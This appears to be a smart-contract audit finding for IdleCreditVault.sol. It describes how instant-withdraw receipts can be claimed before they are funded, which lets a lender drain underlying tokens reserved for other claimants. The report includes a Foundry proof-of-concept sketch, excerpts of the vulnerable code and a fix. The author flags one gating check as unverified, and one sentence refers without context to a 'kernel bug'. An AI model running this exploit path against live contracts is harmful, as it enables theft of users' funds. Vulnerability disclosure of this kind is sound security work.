### Title
Instant-withdraw receipts are payable before the borrower funds them, letting a lender drain underlying reserved for funded withdraw claimants - ([File: contracts/strategies/idle/IdleCreditVault.sol])

### Summary
`requestInstantWithdraw()` publishes a claimable receipt immediately — it mints strategy tokens to the user and increments `instantWithdrawsRequests[_user]` — but the corresponding underlying is only pulled from the borrower later, at `startEpoch`, via `collectInstantWithdrawFunds()`. `claimInstantWithdrawRequest()` pays out against the strategy's underlying balance without checking that the current-epoch instant bucket was actually funded. This mirrors the kernel bug: an object is published to consumers before its backing hook/funding is in place, and concurrent readers (other claimants' reserved funds) are consumed by the premature claim. [1](#0-0) 

### Finding Description
- `requestInstantWithdraw()` burns CDO-held strategy tokens, mints the receipt to the user, and records the request in `instantWithdrawsRequests`, `instantWithdrawsRequestsByEpoch`, `instantWithdrawClaimsByEpoch`, and `pendingInstantWithdraws` — all in one step, with no "unfunded" flag per request. [2](#0-1) 
- Funding arrives only when `IdleCDOEpochVariant` calls `collectInstantWithdrawFunds()`, which decrements `pendingInstantWithdraws` and pulls underlying. Between request and funding, the receipt already exists but is backed by nothing. [3](#0-2) 
- `claimInstantWithdrawRequest()` reads the full `instantWithdrawsRequests[_user]`, burns it, and calls `_transferFundedClaim()`, which transfers any underlying held by the strategy. The only guard in `_transferFundedClaim` protects `defaultRecoveryReserve`; it does not check whether the instant bucket was collected. [4](#0-3) 
- The strategy legitimately holds underlying belonging to other users: borrower-funded amounts collected via `collectWithdrawFunds()` for matured normal withdraw requests (`_claimFundedWithdrawRequest` / `_claimLossAdjustedWithdrawRequest` pay from this balance). An unfunded instant claim spends exactly this money. [5](#0-4) 

Attacker path (unprivileged KYC'd lender, running epoch, `allowInstantWithdraw` on, instant delay elapsed):
1. Deposit earlier or hold tranche tokens; call `IdleCDOEpochVariant.requestInstantWithdraw` during the running epoch.
2. In the same transaction (or any time before the next `startEpoch` triggers `collectInstantWithdrawFunds`), call `claimInstantWithdrawRequest`.
3. The strategy transfers underlying it holds for already-funded normal withdraw claimants to the attacker.

### Impact Explanation
Direct theft: the attacker redeems an instant receipt against underlyings earmarked for other users' funded withdraw claims. When those users later call `claimWithdrawRequest`, the strategy balance is short, so their claim either reverts (permanent/temporary freezing) or is insolvent. The stolen amount is bounded by the strategy's underlying balance at claim time — i.e., the full funded-but-unclaimed withdraw pool plus any non-reserve balance.

### Likelihood Explanation
Requires `allowInstantWithdraw` enabled (a supported mode with dedicated tests and `setInstantWithdrawParams`) and a nonzero strategy-held underlying balance — which is the normal state whenever stopEpoch funding has been collected but not yet claimed. No privileged collusion is needed; the attacker is any wallet that passes `isWalletAllowed`. Caveat: I could not fully verify the CDO-side gating inside `IdleCDOEpochVariant.requestInstantWithdraw` (it may restrict requests to a window before `startEpoch` collects funds); if requests are only permitted when funds are already staged at the CDO, the window shrinks but the claim path still lacks a per-request funded check. The PoC below assumes the standard epoch variant where instant requests are accepted during the running epoch after `instantWithdrawDelay`.

### Recommendation
Track funded vs. unfunded instant receipts separately: either (a) gate `claimInstantWithdrawRequest` so only requests from epochs whose instant bucket has been collected are payable (e.g., record `instantWithdrawsRequestsByEpoch` and require the epoch < current funding epoch, or keep a `fundedInstantWithdraws` counter incremented by `collectInstantWithdrawFunds`), or (b) have `_transferFundedClaim` subtract the unfunded portion of `pendingInstantWithdraws` from the spendable balance in addition to `defaultRecoveryReserve`.

### Proof of Concept
Foundry fork sketch against the epoch-variant setup used in `test/foundry/IdleCreditVault.t.sol`:

```solidity
// Setup: standard epoch variant, allowInstantWithdraw enabled, instantDelay elapsed.
// User victim has a matured normal withdraw request already funded via
// collectWithdrawFunds() — strategy holds `fundedAmount` underlying for them.

// 1) Attacker (KYC'd, holds tranches) requests instant withdraw mid-epoch.
vm.prank(attacker);
cdoEpoch.requestInstantWithdraw(attackTranches, address(tranche));

// Strategy balance is unchanged; pendingInstantWithdraws grew but
// collectInstantWithdrawFunds has NOT been called yet.

// 2) Attacker claims immediately — burns the freshly minted receipt and is paid
//    from underlying reserved for the victim's funded claim.
uint256 balPre = underlying.balanceOf(attacker);
vm.prank(attacker);
cdoEpoch.claimInstantWithdrawRequest();
uint256 stolen = underlying.balanceOf(attacker) - balPre;
assertGt(stolen, 0); // paid out despite zero funding collected

// 3) Victim's funded claim now reverts/underpays: strategy balance < funded claims.
vm.prank(victim);
vm.expectRevert(); // safeTransfer fails or _transferFundedClaim guard trips
cdoEpoch.claimWithdrawRequest();
```

Broken invariant: one receipt → one funded payout (solvency of funded claims). Existing guards do not stop it: `_burn` of the receipt succeeds because the receipt was minted at request time, and `_transferFundedClaim` only ring-fences `defaultRecoveryReserve`, not other users' funded withdraw underlyings.   function requestInstantWithdraw(uint256 _amount, address _user) external {
    _onlyIdleCDO();
    _ensureDefaultRecoveryInitialized();
    // burn strategy tokens from cdo
    _burn(msg.sender, _amount);
  
    // mint equal amount of strategy tokens to the user as receipt, useful in case of default
    _mint(_user, _amount);

    // increase the instant withdraw requests for the user
    instantWithdrawsRequests[_user] += _amount;
    uint256 currentEpoch = epochNumber;
    // we record both per-user (old, kept for compatibility) and per-epoch so on
    // finalization we can distinguish "default-epoch pending instant receipts"
    // from old funded instant receipts.
    instantWithdrawsRequestsByEpoch[_user][currentEpoch] += _amount;
    instantWithdrawClaimsByEpoch[currentEpoch] += _amount;
    // increase the total instant withdraw requests
    pendingInstantWithdraws += _amount;
  }

  /// @notice claim the instant withdraw request
  /// @dev we transfer the underlying tokens
  /// @param _user address of the user
  function claimInstantWithdrawRequest(address _user) external {
    _onlyIdleCDO();
    if (defaultRecoveryFinalized && defaultInstantWithdrawsFinalized) {
      // Clear the defaulted-epoch instant receipt first, then continue so the same call can
      // also pay any older instant receipt that was already funded before default finalization.
      _claimDefaultedInstantWithdrawRequest(_user);
    }
    uint256 amount = instantWithdrawsRequests[_user];
    // burn strategy tokens from user
    _burn(_user, amount);

    instantWithdrawsRequests[_user] = 0;
    _transferFundedClaim(_user, amount);
  }

  /// @notice collect the instant withdraw funds
  /// @dev only IdleCDO can call this function
  /// @param _amount number of tokens to collect
  function collectInstantWithdrawFunds(uint256 _amount) external {
    _onlyIdleCDO();
    if (_amount == 0) return;
    pendingInstantWithdraws -= _amount;
    underlyingToken.safeTransferFrom(idleCDO, address(this), _amount);
  }

  function collectWithdrawFunds(uint256 _amount) external {
    _onlyIdleCDO();
    uint256 pendingBasis = pendingWithdraws;
    if (_amount < pendingBasis) {
      // Legacy receipts do not have per-epoch ownership data, so they can only be fully funded.
      if (!defaultRecoveryInitialized) revert NotAllowed();
      uint256 lossRecoveryPrice = _amount * RECOVERY_FULL / pendingBasis;
      // Avoid storing a zero price, which is indistinguishable from "no loss-adjusted epoch".
      if (lossRecoveryPrice == 0) revert NotAllowed();
      pendingWithdraws = 0;
      lossRecoveryPriceByEpoch[epochNumber] = lossRecoveryPrice;
    } else {
      // A plain implementation upgrade may leave legacy normal receipts pending. Their next
      // successful stop can fully fund the aggregate before lazy initialization occurs.
      pendingWithdraws = pendingBasis - _amount;
    }
    if (_amount != 0) {
      underlyingToken.safeTransferFrom(idleCDO, address(this), _amount);
    }
  }

  function _transferFundedClaim(address _user, uint256 _amount) internal {
    if (_amount == 0) return;
    uint256 reserve = defaultRecoveryReserve;
    if (reserve != 0) {
      uint256 balance = underlyingToken.balanceOf(address(this));
      // This should be unreachable when accounting is consistent. Keep the guard so old funded
      // receipts can never spend underlyings reserved for default recovery claimants.
      if (balance < reserve || balance - reserve < _amount) revert NotAllowed();
    }
    underlyingToken.safeTransfer(_user, _amount);
  }
